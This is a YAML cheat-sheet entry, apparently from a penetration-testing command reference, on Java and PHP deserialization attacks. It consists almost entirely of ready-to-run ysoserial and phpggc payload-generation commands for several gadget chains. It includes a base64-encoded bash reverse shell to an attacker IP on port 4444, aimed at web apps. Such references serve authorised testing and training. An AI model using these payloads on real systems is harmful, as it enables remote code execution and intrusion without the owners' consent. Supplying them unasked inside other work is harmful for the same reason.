---
description: |
  Java deserialization attacks using ysoserial. Common in
  Java web apps, Jenkins, JBoss, WebLogic.

  Reference values:
    Attacker IP: 10.10.14.1
command: |
  # Generate payload
  java -jar ysoserial.jar CommonsCollections1 'ping 10.10.14.1' > payload.bin

  # Common gadget chains
  java -jar ysoserial.jar CommonsCollections1 'cmd'
  java -jar ysoserial.jar CommonsCollections4 'cmd'
  java -jar ysoserial.jar CommonsBeanutils1 'cmd'

  # Base64 encoded for web apps
  java -jar ysoserial.jar CommonsCollections1 'bash -i >& /dev/tcp/10.10.14.1/4444 0>&1' | base64 -w 0

  # PHP deserialization (phpggc)
  phpggc Laravel/RCE1 system "id" -b
  phpggc Symfony/RCE4 exec "id" -b
phase:
  - Exploitation
target_os:
  - Linux
  - Windows
services:
  - HTTP
items:
  - No_Creds
techniques:
  - Deserialization
network_position:
  - External
  - Internal
references:
  - https://github.com/frohoff/ysoserial
  - https://github.com/ambionics/phpggc
---
